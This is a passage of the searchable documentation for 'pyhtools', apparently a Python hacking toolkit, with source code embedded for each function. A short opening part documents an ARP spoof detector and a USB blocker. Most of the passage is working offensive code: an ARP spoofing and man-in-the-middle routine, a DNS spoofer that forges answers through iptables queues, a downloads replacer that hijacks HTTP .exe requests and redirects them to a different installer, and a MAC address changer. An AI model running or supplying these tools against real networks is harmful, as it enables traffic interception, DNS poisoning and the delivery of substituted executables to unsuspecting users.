Local MITM attacks\n    '''\ndef __init__(self, interface: str) -&gt; None:\n'''SpoofDetector class constructor\n        Args:\n            interface (str): network interface on which spoofing needs to be detected\n        Returns:\n            None\n        '''\nself.interface = interface\ndef get_mac(self, ip: str):\n'''returns mac address of the ip\n        Args:\n            ip (str): ip address of the string\n        Returns:\n            str: Mac address of the ip in the network\n        '''\narp_req = sp.ARP(pdst=ip)\nbrdcst = sp.Ether(dst='ff:ff:ff:ff:ff:ff')\npacket = brdcst / arp_req\nresponded_list = sp.srp(packet, timeout=1, verbose=False)[0]\nreturn str(responded_list[0][1].hwsrc)\ndef check_spoof(self, packet) -&gt; bool:\n'''checks if machine is under ARP/MITM attack\n        Args:\n            packet (scapy.Packet): sniffed scapy packet from the interface\n        Returns:\n            bool: True if ARP spoofing/poisoning detected else False\n        '''\nif packet.haslayer(sp.ARP) and packet[sp.ARP].op == 2:\ntry:\nreal_mac = self.get_mac(packet[sp.ARP].psrc)\nresponse_mac = packet[sp.ARP].hwsrc\nif real_mac != response_mac:\nprint(\nf\"[!] ARP Spoof Detected! {response_mac} is imposter. {response_mac} is spoofing as {real_mac}\")\nexcept IndexError:\npass\ndef start(self):\n'''captures and processes packets to check whether network is being attacked or not\n        Args:\n            None:\n        Returns:\n            None\n        '''\nsp.sniff(iface=self.interface, store=False, prn=self.check_spoof)\n</code></pre>"},{"location":"code-docs/detectors/#pyhtools.detectors.arp_spoof_detector.SpoofDetector.__init__","title":"<code>__init__(interface)</code>","text":"<p>SpoofDetector class constructor</p> <p>Parameters:</p> Name Type Description Default <code>interface</code> <code>str</code> <p>network interface on which spoofing needs to be detected</p> required <p>Returns:</p> Type Description <code>None</code> <p>None</p> Source code in <code>pyhtools\\detectors\\arp_spoof_detector.py</code> <pre><code>def __init__(self, interface: str) -&gt; None:\n'''SpoofDetector class constructor\n    Args:\n        interface (str): network interface on which spoofing needs to be detected\n    Returns:\n        None\n    '''\nself.interface = interface\n</code></pre>"},{"location":"code-docs/detectors/#pyhtools.detectors.arp_spoof_detector.SpoofDetector.check_spoof","title":"<code>check_spoof(packet)</code>","text":"<p>checks if machine is under ARP/MITM attack</p> <p>Parameters:</p> Name Type Description Default <code>packet</code> <code>scapy.Packet</code> <p>sniffed scapy packet from the interface</p> required <p>Returns:</p> Name Type Description <code>bool</code> <code>bool</code> <p>True if ARP spoofing/poisoning detected else False</p> Source code in <code>pyhtools\\detectors\\arp_spoof_detector.py</code> <pre><code>def check_spoof(self, packet) -&gt; bool:\n'''checks if machine is under ARP/MITM attack\n    Args:\n        packet (scapy.Packet): sniffed scapy packet from the interface\n    Returns:\n        bool: True if ARP spoofing/poisoning detected else False\n    '''\nif packet.haslayer(sp.ARP) and packet[sp.ARP].op == 2:\ntry:\nreal_mac = self.get_mac(packet[sp.ARP].psrc)\nresponse_mac = packet[sp.ARP].hwsrc\nif real_mac != response_mac:\nprint(\nf\"[!] ARP Spoof Detected! {response_mac} is imposter. {response_mac} is spoofing as {real_mac}\")\nexcept IndexError:\npass\n</code></pre>"},{"location":"code-docs/detectors/#pyhtools.detectors.arp_spoof_detector.SpoofDetector.get_mac","title":"<code>get_mac(ip)</code>","text":"<p>returns mac address of the ip</p> <p>Parameters:</p> Name Type Description Default <code>ip</code> <code>str</code> <p>ip address of the string</p> required <p>Returns:</p> Name Type Description <code>str</code> <p>Mac address of the ip in the network</p> Source code in <code>pyhtools\\detectors\\arp_spoof_detector.py</code> <pre><code>def get_mac(self, ip: str):\n'''returns mac address of the ip\n    Args:\n        ip (str): ip address of the string\n    Returns:\n        str: Mac address of the ip in the network\n    '''\narp_req = sp.ARP(pdst=ip)\nbrdcst = sp.Ether(dst='ff:ff:ff:ff:ff:ff')\npacket = brdcst / arp_req\nresponded_list = sp.srp(packet, timeout=1, verbose=False)[0]\nreturn str(responded_list[0][1].hwsrc)\n</code></pre>"},{"location":"code-docs/detectors/#pyhtools.detectors.arp_spoof_detector.SpoofDetector.start","title":"<code>start()</code>","text":"<p>captures and processes packets to check whether network is being attacked or not</p> <p>Parameters:</p> Name Type Description Default <code>None</code> required <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\detectors\\arp_spoof_detector.py</code> <pre><code>def start(self):\n'''captures and processes packets to check whether network is being attacked or not\n    Args:\n        None:\n    Returns:\n        None\n    '''\nsp.sniff(iface=self.interface, store=False, prn=self.check_spoof)\n</code></pre>"},{"location":"code-docs/detectors/#win-block-usb","title":"Win Block USB","text":"<p>Blocks all root hubs on windows machine</p>"},{"location":"code-docs/detectors/#pyhtools.detectors.win_block_usb.block_root_hubs","title":"<code>block_root_hubs()</code>","text":"<p>Blocks USB root hubs on windows machine</p> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\detectors\\win_block_usb.py</code> <pre><code>def block_root_hubs():\n'''Blocks USB root hubs on windows machine\n    Args:\n        None\n    Returns:\n        None\n    '''\nres, rcode = run_cmd(\ncmd='pnputil /enum-devices /class \"USB\"',\nsucc_msg='Fetched USB devices ids list',\nerr_msg='Error occurred while device ids list',\n)\nif rcode == 0:\nfor line in res.splitlines():\nif \"USB\\ROOT_HUB\" in line:\ndevice_id = line.split(':')[-1].strip()\nres, rcode = run_cmd(\ncmd=f'pnputil /disable-device \"{device_id}\"',\nsucc_msg=f'USB {device_id} blocked',\nerr_msg=f'Cannot disable USB {device_id}'\n)\n</code></pre>"},{"location":"code-docs/detectors/#pyhtools.detectors.win_block_usb.run_cmd","title":"<code>run_cmd(cmd, succ_msg, err_msg, succ_rcode=0)</code>","text":"<p>Run shell commands</p> <p>Parameters:</p> Name Type Description Default <code>cmd</code> <code>str</code> <p>command to be executed</p> required <code>succ_msg</code> <code>str</code> <p>message to be logged if cmd is executed successfully</p> required <code>err_msg</code> <code>str</code> <p>message to be logged if cmd is interrupted</p> required <code>succ_rcode</code> <code>int</code> <p>return status code after successfully executing code</p> <code>0</code> <p>Returns:</p> Name Type Description <code>tuple</code> <code>tuple</code> <p>returns executed command output/error along with status code</p> Source code in <code>pyhtools\\detectors\\win_block_usb.py</code> <pre><code>def run_cmd(cmd:str, succ_msg:str, err_msg:str, succ_rcode:int=0) -&gt; tuple:\n'''Run shell commands\n    Args:\n        cmd (str): command to be executed\n        succ_msg (str): message to be logged if cmd is executed successfully\n        err_msg (str): message to be logged if cmd is interrupted\n        succ_rcode (int): return status code after successfully executing code\n    Returns:\n        tuple: returns executed command output/error along with status code\n    '''\nresult = run(split(cmd), stderr=PIPE, stdout=PIPE)\nres = result.stdout.decode('utf-8') or result.stderr.decode('utf-8')\nrcode = result.returncode\nif rcode == succ_rcode:\nlogger.info(succ_msg)\nelse:\nlogger.error(err_msg)\nreturn (res, rcode)\n</code></pre>"},{"location":"code-docs/network-attackers/","title":"Network Attackers Documentation","text":""},{"location":"code-docs/network-attackers/#arp-spoofer","title":"Arp spoofer","text":""},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.arpspoofer.check_args","title":"<code>check_args(target_ip, spoof_ip)</code>","text":"<p>checks if arguments fetched are valid</p> <p>Parameters:</p> Name Type Description Default <code>target_ip</code> <code>str</code> <p>IP address of the target</p> required <code>spoof_ip</code> <code>str</code> <p>spoofed IP address which should be binded with your MAC address</p> required <p>Returns:</p> Name Type Description <code>bool</code> <p>True if all args are valid else exit</p> Source code in <code>pyhtools\\attackers\\Network\\arpspoofer.py</code> <pre><code>def check_args(target_ip, spoof_ip):\n'''checks if arguments fetched are valid\n    Args:\n        target_ip (str): IP address of the target\n        spoof_ip (str): spoofed IP address which should be binded with your MAC address\n    Returns:\n        bool: True if all args are valid else exit\n    '''\nif not target_ip:\nexit(BRIGHT_RED +\n\"[-] Please enter target ip as argument, use -h or --help for more info\")\nelif not spoof_ip:\nexit(BRIGHT_RED +\n\"[-] Please enter spoof ip as argument, use -h or --help for more info\")\nreturn True\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.arpspoofer.generate_packet","title":"<code>generate_packet(pdst, hwdst, psrc)</code>","text":"<p>generates spoof packets.</p> <p>Parameters:</p> Name Type Description Default <code>pdst</code> <code>str</code> <p>IP address of destination</p> required <code>hwdst</code> <code>str</code> <p>MAC address of destination</p> required <code>psrc</code> <code>str</code> <p>IP address of source</p> required <p>Returns:</p> Type Description <p>scapy.ARP: spoofed ARP packet with specified configuration</p> Source code in <code>pyhtools\\attackers\\Network\\arpspoofer.py</code> <pre><code>def generate_packet(pdst, hwdst, psrc):\n'''generates spoof packets.\n    Args:\n        pdst (str): IP address of destination\n        hwdst (str): MAC address of destination\n        psrc (str): IP address of source\n    Returns:\n        scapy.ARP: spoofed ARP packet with specified configuration\n    '''\npacket = sp.ARP(op=2, pdst=pdst, hwdst=hwdst, psrc=psrc)\nreturn packet\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.arpspoofer.get_args","title":"<code>get_args()</code>","text":"<p>get arguments from command line</p> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\arpspoofer.py</code> <pre><code>def get_args():\n'''get arguments from command line\n    Args:\n        None\n    Returns:\n        None\n    '''\nparser = argparse.ArgumentParser('ARP spoofer')\nparser.add_argument('-t', '--target', dest='target', help='target ip')\nparser.add_argument('-s', '--spoof', dest='spoof', help='spoof ip')\nparser.add_argument('-mitm', '--man-in-the-middle', dest='mitm',\nhelp='switch for mitm attack option, default is 0')\nargs = parser.parse_args()\ntarget_ip = args.target\nspoof_ip = args.spoof\nmitm = args.mitm\ndel args\nreturn target_ip, spoof_ip, mitm\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.arpspoofer.get_mac","title":"<code>get_mac(ip)</code>","text":"<p>retrieves mac address from the ip.</p> <p>Parameters:</p> Name Type Description Default <code>ip</code> <code>str</code> <p>IP address</p> required <p>Returns:</p> Name Type Description <code>str</code> <p>MAC address of specified IP address</p> Source code in <code>pyhtools\\attackers\\Network\\arpspoofer.py</code> <pre><code>def get_mac(ip):\n'''retrieves mac address from the ip.\n    Args:\n        ip (str): IP address\n    Returns:\n        str: MAC address of specified IP address\n    '''\ntry:\narp_req = sp.ARP(pdst=ip)\nbrdcst = sp.Ether(dst='ff:ff:ff:ff:ff:ff')\npacket = brdcst / arp_req\nresponded_list = sp.srp(packet, timeout=2, verbose=False, retry=3)[0]\nreturn responded_list[0][1].hwsrc\nexcept PermissionError:\nprint(BRIGHT_RED + '[-] run with sudo.')\nexit()\nexcept IndexError:\nprint(BRIGHT_YELLOW + '\\r[!] Unable to find target.')\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.arpspoofer.mitm","title":"<code>mitm(target_ip, spoof_ip, args_status)</code>","text":"<p>performs man in the middle attack by arp poisoning</p> <p>Parameters:</p> Name Type Description Default <code>target_ip</code> <code>str</code> <p>IP address of target machine</p> required <code>spoof_ip</code> <code>str</code> <p>IP address to be spoofed by attacker's machine</p> required <code>args_status</code> <code>bool</code> <p>True if cli args are valid else False</p> required <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\arpspoofer.py</code> <pre><code>def mitm(target_ip, spoof_ip, args_status):\n'''performs man in the middle attack by arp poisoning\n    Args:\n        target_ip (str): IP address of target machine\n        spoof_ip (str): IP address to be spoofed by attacker's machine\n        args_status (bool): True if cli args are valid else False\n    Returns:\n        None\n    '''\nprint(BRIGHT_YELLOW + '[+] Launching MITM ARP Attack....')\npackets_sent = 0\nis_attacking = True\nwhile is_attacking:\ntry:\nspoof(target_ip, spoof_ip, args_status)\nspoof(spoof_ip, target_ip, args_status)\npackets_sent += 2\nprint(BRIGHT_WHITE + '\\r[+] Packets sent: ' +\nstr(packets_sent), end='')\nsleep(2)\nexcept KeyboardInterrupt:\nprint(BRIGHT_YELLOW +\n'\\r\\n[+] Stopping MITM attack and restoring default settings...')\nis_attacking = False\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.arpspoofer.restore_default_table","title":"<code>restore_default_table(dst_ip, src_ip)</code>","text":"<p>restore default arp table of spoofed targets</p> <p>Parameters:</p> Name Type Description Default <code>dst_ip</code> <code>str</code> <p>IP address of destination machine</p> required <code>src_ip</code> <code>str</code> <p>IP address to be spoofed by src machine</p> required <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\arpspoofer.py</code> <pre><code>def restore_default_table(dst_ip, src_ip):\n'''restore default arp table of spoofed targets\n    Args:\n        dst_ip (str): IP address of destination machine\n        src_ip (str): IP address to be spoofed by src machine\n    Returns:\n        None\n    '''\ntry:\ndst_mac = get_mac(dst_ip)\nsrc_mac = get_mac(src_ip)\npacket = sp.ARP(op=2, pdst=dst_ip, hwdst=dst_mac,\npsrc=src_ip, hwsrc=src_mac)\nsp.send(packet, verbose=False, count=4)\nexcept Exception as e:\nprint(BRIGHT_RED +\n'[-] Exception occurred while restoring MAC address')\nraise(e)\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.arpspoofer.run_spoofer","title":"<code>run_spoofer(target_ip, spoof_ip, perform_mitm)</code>","text":"<p>start spoofer</p> <p>Parameters:</p> Name Type Description Default <code>dst_ip</code> <code>str</code> <p>IP address of destination machine</p> required <code>src_ip</code> <code>str</code> <p>IP address to be spoofed by src machine</p> required <code>perform_mitm</code> <code>bool</code> <p>True if MITM has to be performed else False</p> required <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\arpspoofer.py</code> <pre><code>def run_spoofer(target_ip, spoof_ip, perform_mitm):\n'''start spoofer\n    Args:\n        dst_ip (str): IP address of destination machine\n        src_ip (str): IP address to be spoofed by src machine\n        perform_mitm (bool): True if MITM has to be performed else False\n    Returns:\n        None\n    '''\nTARGET_IP, SPOOF_IP, MITM = target_ip, spoof_ip, perform_mitm\nARGS_STATUS = check_args(TARGET_IP, SPOOF_IP)\nif MITM == '1' or MITM:\nprint(BRIGHT_YELLOW + '[*] Performing MITM attack...')\nmitm(TARGET_IP, SPOOF_IP, ARGS_STATUS)\nelse:\nprint(BRIGHT_YELLOW +\nf'[*] Performing Spoof Only on {TARGET_IP} as {SPOOF_IP}...')\nspoof_only(TARGET_IP, SPOOF_IP, ARGS_STATUS)\nprint(BRIGHT_YELLOW +\n'[+] Restoring default table for target and gateway....')\nrestore_default_table(TARGET_IP, SPOOF_IP)\nrestore_default_table(SPOOF_IP, TARGET_IP)\nprint(BRIGHT_RED + '[+] Closing ARPSPOOFER...')\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.arpspoofer.spoof","title":"<code>spoof(target_ip, spoof_ip, args_status)</code>","text":"<p>spoof target with spoof ip mac</p> <p>Parameters:</p> Name Type Description Default <code>target_ip</code> <code>str</code> <p>IP address of target machine</p> required <code>spoof_ip</code> <code>str</code> <p>IP address to be spoofed by attacker's machine</p> required <code>args_status</code> <code>bool</code> <p>True if cli args are valid else False</p> required <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\arpspoofer.py</code> <pre><code>def spoof(target_ip, spoof_ip, args_status):\n'''spoof target with spoof ip mac\n    Args:\n        target_ip (str): IP address of target machine\n        spoof_ip (str): IP address to be spoofed by attacker's machine\n        args_status (bool): True if cli args are valid else False\n    Returns:\n        None\n    '''\nif args_status:\ntarget_mac = get_mac(target_ip)\nPACKET = generate_packet(target_ip, target_mac, spoof_ip)\nsp.send(PACKET, verbose=False)\nelse:\nprint('[-] Error while spoofing the target ' + target_ip)\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.arpspoofer.spoof_only","title":"<code>spoof_only(target_ip, spoof_ip, args_status)</code>","text":"<p>only spoofs the specified target.</p> <p>Parameters:</p> Name Type Description Default <code>target_ip</code> <code>str</code> <p>IP address of target machine</p> required <code>spoof_ip</code> <code>str</code> <p>IP address to be spoofed by attacker's machine</p> required <code>args_status</code> <code>bool</code> <p>True if cli args are valid else False</p> required <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\arpspoofer.py</code> <pre><code>def spoof_only(target_ip, spoof_ip, args_status):\n'''only spoofs the specified target.\n    Args:\n        target_ip (str): IP address of target machine\n        spoof_ip (str): IP address to be spoofed by attacker's machine\n        args_status (bool): True if cli args are valid else False\n    Returns:\n        None\n    '''\nprint(BRIGHT_YELLOW + f'[+] Spoofing {target_ip} as {spoof_ip}....')\npackets_sent = 0\nis_spoofing = True\nwhile is_spoofing:\ntry:\nspoof(target_ip, spoof_ip, args_status)\nprint(BRIGHT_WHITE + '\\r[+] Packets sent: ' +\nstr(packets_sent), end='')\npackets_sent += 1\nsleep(2)\nexcept KeyboardInterrupt:\nprint(BRIGHT_YELLOW +\n'\\r\\n[+] Stopping and restoring default settings...')\nis_spoofing = False\n</code></pre>"},{"location":"code-docs/network-attackers/#dns-spoofer","title":"DNS Spoofer","text":""},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.dnsspoofer.forward_packets","title":"<code>forward_packets()</code>","text":"<p>configures the mitm for incoming request packets into a queue</p> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\dnsspoofer.py</code> <pre><code>def forward_packets():\n'''configures the mitm for incoming request packets\n    into a queue\n    Args:\n        None\n    Returns:\n        None\n    '''\n# executing the following command\n# iptables -I FOWARD -j NFQUEUE --queue-num (any number)\n# sudo iptables -I FORWARD -j NFQUEUE --queue-num 0\n# -I -&gt; insert (packet into a chain specified by the user)\n# -j -&gt; jump if the packet matches the target.\n# --queue-num -&gt; jump to specfic queue number\ncall('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)\n# for local host\ncall('sudo iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)\ncall('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.dnsspoofer.process_packet","title":"<code>process_packet(packet)</code>","text":"<p>process received packet, everytime a packet is received. prints the packet received in the queue and it changes  the DNS response dest ip with your desired ip</p> <p>Parameters:</p> Name Type Description Default <code>packet</code> <code>scapy.IP</code> <p>IP packet from netfilterqueue/iptables </p> required <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\dnsspoofer.py</code> <pre><code>def process_packet(packet):\n'''\n    process received packet, everytime a packet is received.\n    prints the packet received in the queue and it changes \n    the DNS response dest ip with your desired ip\n    Args:\n        packet (scapy.IP): IP packet from netfilterqueue/iptables \n    Returns:\n        None\n    '''\nscapy_pkt = scapy.IP(packet.get_payload())\n# Check for DNS layer in DNS Request Record (DNSRR) or \n# DNS Question Record (DNSQR)\nif scapy_pkt.haslayer(scapy.DNSRR):\nqname = scapy_pkt[scapy.DNSQR].qname\nif SPOOF_WEBSITE in qname:\nprint('[*] Spoofing target ...')\nresponse = scapy.DNSRR(rrname=qname, rdata=SPOOF_RDATA)\nscapy_pkt[scapy.DNS].an = response\nscapy_pkt[scapy.DNS].ancount = 1\n# remove IP.len,IP.chksum,UDP.len,UDP.chksum to make\n# sure that our packet looks untampered and scapy will\n# calculate it again for us.\ndel scapy_pkt[scapy.IP].len\ndel scapy_pkt[scapy.IP].chksum\ndel scapy_pkt[scapy.UDP].len\ndel scapy_pkt[scapy.UDP].chksum\npacket.set_payload(bytes(scapy_pkt))\nprint(packet)\npacket.accept()\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.dnsspoofer.reset_config","title":"<code>reset_config()</code>","text":"<p>resets the configurations changed while exectution of the program to  its original configuration</p> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\dnsspoofer.py</code> <pre><code>def reset_config():\n'''\n    resets the configurations changed while exectution of the program to \n    its original configuration\n    Args:\n        None\n    Returns:\n        None\n    '''\ncall('sudo iptables --flush', shell=True)\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.dnsspoofer.run","title":"<code>run()</code>","text":"<p>Starts DNS spoofer</p> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\dnsspoofer.py</code> <pre><code>def run():\n'''Starts DNS spoofer\n    Args:\n        None\n    Returns:\n        None\n    '''\nprint('[*] configuring packet receiver...')\nforward_packets()\nprint('[*] packet receiver configured successfully.\\n')\nprint('[*] Creating Queue to start receiving packets.')\ntry:\nqueue = netfilterqueue.NetfilterQueue()\n# Bind queue with queue-number 0\nqueue.bind(0, process_packet)\nqueue.run()\nexcept OSError as e:\nprint('[-] Run script with root priviliges.')\nprint(e)\nexcept KeyboardInterrupt:\nprint('\\r[-] Keyboard Interrupt detected!')\nexcept Exception:\nprint('[-] An Exception occurred while creating queue.\\n', Exception)\nfinally:\nprint('[*] Restoring previous configurations.. please be patient...')\nreset_config()\nprint('[-] Program stopped.')\n</code></pre>"},{"location":"code-docs/network-attackers/#downloads-replacer","title":"Downloads Replacer","text":""},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.downloads_replacer.forward_packets","title":"<code>forward_packets()</code>","text":"<p>configures the mitm for incoming request packets into a queue.</p> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\downloads_replacer.py</code> <pre><code>def forward_packets():\n'''\n    configures the mitm for incoming request packets\n    into a queue.\n    Args:\n        None\n    Returns:\n        None\n    '''\n# executing the following command\n# iptables -I FOWARD -j NFQUEUE --queue-num (any number)\n# sudo iptables -I FORWARD -j NFQUEUE --queue-num 0\n# -I -&gt; insert (packet into a chain specified by the user)\n# -j -&gt; jump if the packet matches the target.\n# --queue-num -&gt; jump to specfic queue number\ncall('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.downloads_replacer.process_packet","title":"<code>process_packet(packet)</code>","text":"<p>process received packet, everytime a packet is received. prints the packet received in the queue and it changes  the DNS response dest ip with your desired ip.</p> <p>Parameters:</p> Name Type Description Default <code>packet</code> <code>scapy.IP</code> <p>packet from netfilterqueue/iptables</p> required <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\downloads_replacer.py</code> <pre><code>def process_packet(packet):\n'''\n    process received packet, everytime a packet is received.\n    prints the packet received in the queue and it changes \n    the DNS response dest ip with your desired ip.\n    Args:\n        packet (scapy.IP): packet from netfilterqueue/iptables\n    Returns:\n        None\n    '''\nscapy_pkt = scapy.IP(packet.get_payload())\n# HTTP layer is in the Raw layer.\n# if dport (destination port) = http (i.e. port 80) in TCP and raw layer \n# consists of get method then, packet consists a HTTP request.\n# \n# if sport (source port) = http (80) in TCP then the packet consists \n# a HTTP response.\n#  \nif scapy_pkt.haslayer(scapy.Raw):\nif scapy_pkt[scapy.TCP].dport == 80:\nif b\".exe\" in scapy_pkt[scapy.Raw].load:\nprint('[*] EXE Request Detected!')\nack_list.append(scapy_pkt[scapy.TCP].ack)\nelif scapy_pkt[scapy.TCP].sport == 80:\nif scapy_pkt[scapy.TCP].seq in ack_list:\nprint('[*] Replacing File!\\n')\nack_list.remove(scapy_pkt[scapy.TCP].seq)\nmodified_pkt = set_load(scapy_pkt, \"HTTP/1.1 301 Moved Permanently\\nLocation: https://referrals.brave.com/latest/BraveBrowserSetup.exe \\n\\n\")\npacket.set_payload(bytes(modified_pkt))\npacket.accept()\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.downloads_replacer.reset_config","title":"<code>reset_config()</code>","text":"<p>resets the configurations changed while exectution of the program to  its original configuration</p> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\downloads_replacer.py</code> <pre><code>def reset_config():\n'''\n    resets the configurations changed while exectution of the program to \n    its original configuration\n    Args:\n        None\n    Returns:\n        None\n    '''\ncall('sudo iptables --flush', shell=True)\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.downloads_replacer.run","title":"<code>run()</code>","text":"<p>Starts download replacer</p> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\downloads_replacer.py</code> <pre><code>def run():\n'''Starts download replacer\n    Args:\n        None\n    Returns:\n        None\n    '''\nprint('[*] configuring packet receiver...')\nforward_packets()\nprint('[*] packet receiver configured successfully.\\n')\nprint('[*] Creating Queue to start receiving packets.')\ntry:\nqueue = netfilterqueue.NetfilterQueue()\n# Bind queue with queue-number 0\nqueue.bind(0, process_packet)\nqueue.run()\nexcept OSError as e:\nprint('[-] Run script with root priviliges.')\nprint(e)\nexcept KeyboardInterrupt:\nprint('\\r[-] Keyboard Interrupt detected!')\nexcept Exception:\nprint('[-] An Exception occurred while creating queue.\\n', Exception)\nfinally:\nprint('[*] Restoring previous configurations.. please be patient...')\nreset_config()\nprint('[-] Program stopped.')\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.downloads_replacer.set_load","title":"<code>set_load(packet, load)</code>","text":"<p>sets the packet raw layer load value to the passed load value</p> <p>Parameters:</p> Name Type Description Default <code>packet</code> <code>scapy.IP</code> <p>scapy IP packet</p> required <code>load</code> <code>bytes</code> <p>payload data as bytes</p> required <p>Returns:</p> Type Description <p>scapy.IP: returns packet with load</p> Source code in <code>pyhtools\\attackers\\Network\\downloads_replacer.py</code> <pre><code>def set_load(packet, load):\n'''sets the packet raw layer load value to the passed load value\n    Args:\n        packet (scapy.IP): scapy IP packet\n        load (bytes): payload data as bytes\n    Returns:\n        scapy.IP: returns packet with load\n    '''\npacket[scapy.Raw].load = load\n# since now the packet has been tampered, the new \n# packet will have differet length and checksums\n# so we'll delete these fields and scapy will \n# automatically calulate these for us.\ndel packet[scapy.IP].len\ndel packet[scapy.IP].chksum\ndel packet[scapy.TCP].chksum\nreturn packet\n</code></pre>"},{"location":"code-docs/network-attackers/#mac-changer","title":"Mac Changer","text":""},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.machngr.change_mac","title":"<code>change_mac(intrfc, new_mac)</code>","text":"<p>changes mac address of the interface. returns True if mac changes successfully.</p> <p>Parameters:</p> Name Type Description Default <code>intrfc</code> <code>str</code> <p>network interface whose MAC address needs to be changed</p> required <code>new_mac</code> <code>str</code> <p>new MAC address for the network interface</p> required <p>Returns:</p> Name Type Description <code>bool</code> <p>Returns True if MAC address is changed successfully else exits program</p> Source code in <code>pyhtools\\attackers\\Network\\machngr.py</code> <pre><code>def change_mac(intrfc, new_mac):\n'''changes mac address of the interface. returns True if mac changes successfully.\n    Args:\n        intrfc (str): network interface whose MAC address needs to be changed\n        new_mac (str): new MAC address for the network interface\n    Returns: \n        bool: Returns True if MAC address is changed successfully else exits program\n    '''\nif check_args(intrfc, new_mac):\ntry:\nsubprocess.call(['sudo', 'ifconfig', intrfc, 'down'])\nsubprocess.call(\n['sudo', 'ifconfig', intrfc, 'hw', 'ether', new_mac])\nsubprocess.call(['sudo', 'ifconfig', intrfc, 'up'])\nreturn True\nexcept Exception as e:\nexit(BRIGHT_RED + '[-] Error occured while changing MAC address')\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.machngr.check_args","title":"<code>check_args(intrfc, new_mac)</code>","text":"<p>checks if args are valid, prints appropriate error and exit</p> <p>Parameters:</p> Name Type Description Default <code>intrfc</code> <code>str</code> <p>network interface whose MAC address needs to be changed</p> required <code>new_mac</code> <code>str</code> <p>new MAC address for the network interface</p> required <p>Returns:</p> Name Type Description <code>bool</code> <p>Returns True if all parsed arguments are valid</p> Source code in <code>pyhtools\\attackers\\Network\\machngr.py</code> <pre><code>def check_args(intrfc, new_mac):\n'''checks if args are valid, prints appropriate error and exit\n    Args:\n        intrfc (str): network interface whose MAC address needs to be changed\n        new_mac (str): new MAC address for the network interface\n    Returns: \n        bool: Returns True if all parsed arguments are valid\n    '''\nif not intrfc:\nexit(BRIGHT_RED +\n\"[-] Please enter interface argument, use -h or --help for more info\")\nelif not new_mac:\nexit(BRIGHT_RED +\n\"[-] Please enter new mac address as argument, use -h or --help for more info\")\nreturn True\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.machngr.check_mac_change","title":"<code>check_mac_change(intrfc, new_mac, mac_change_status)</code>","text":"<p>checks if mac address has been changed</p> <p>Parameters:</p> Name Type Description Default <code>intrfc</code> <code>str</code> <p>network interface whose MAC address needs to be changed</p> required <code>new_mac</code> <code>str</code> <p>new MAC address for the network interface</p> required <p>Returns:</p> Name Type Description <code>bool</code> <p>Returns True if MAC address was changed successfully else False</p> Source code in <code>pyhtools\\attackers\\Network\\machngr.py</code> <pre><code>def check_mac_change(intrfc, new_mac, mac_change_status):\n'''checks if mac address has been changed\n    Args:\n        intrfc (str): network interface whose MAC address needs to be changed\n        new_mac (str): new MAC address for the network interface\n    Returns: \n        bool: Returns True if MAC address was changed successfully else False\n    '''\nstatus = False\nif mac_change_status:\nifconfig_result = subprocess.check_output(['sudo', 'ifconfig', intrfc])\nmac_regex = r\"\\w\\w:\\w\\w:\\w\\w:\\w\\w:\\w\\w:\\w\\w\"\nmac_check_result = re.search(mac_regex, str(ifconfig_result))\nif mac_check_result:\nif mac_check_result.group(0) == new_mac:\nprint(BRIGHT_YELLOW + f'[+] {intrfc}  MAC successfully changed\\n',\nBRIGHT_WHITE + f'\\r[+] Current Mac: {mac_check_result.group(0)}')\nstatus = True\nelse:\nprint(\nBRIGHT_RED + f\"[-] {intrfc} MAC is not changed/ error while reading MAC address please try again\")\nprint(BRIGHT_YELLOW +\n\"[+] Current Mac: \" + mac_check_result.group(0))\nelse:\nprint(BRIGHT_RED + \"[-] MAC not found\")\nreturn 